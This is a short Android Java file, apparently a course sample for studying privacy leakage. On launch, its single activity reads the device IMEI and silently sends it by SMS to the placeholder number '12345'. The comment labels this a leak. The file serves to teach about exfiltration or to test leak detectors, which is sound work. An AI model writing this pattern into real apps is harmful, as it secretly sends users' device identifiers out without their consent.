package edu.toronto.ece1776.sample.privacyleakage;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        leakIMEI();
    }

    // This method leaks the device IMEI
    private void leakIMEI() {
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String deviceId = telephonyManager.getDeviceId();

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("12345", null, deviceId, null, null);
    }
}
